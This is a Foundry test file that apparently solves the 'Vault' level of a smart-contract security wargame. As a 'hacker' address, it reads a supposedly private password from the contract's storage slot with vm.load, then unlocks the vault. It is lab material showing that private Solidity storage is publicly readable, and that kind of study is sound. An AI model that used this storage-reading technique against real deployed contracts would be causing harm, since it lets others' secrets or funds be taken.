// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/08_Vault.sol";

contract VaultTest is Test {
    Vault public vt;

    address public hacker = address(0x1337); 
    
    function setUp() public {
        bytes32 secretPassword = "A very strong secret password!";
        vt = new Vault(secretPassword);
        vm.deal(hacker, 10 ether); 
    }

    function testExploit() public {
        vm.startPrank(hacker);
        console.log("locked value before:", vt.locked());
        bytes32 interceptedPassword = vm.load(address(vt), bytes32(uint256(1)));
        vt.unlock(interceptedPassword);
        assertEq(vt.locked(), false);
        console.log("locked value after:", vt.locked());
        vm.stopPrank();
    }
}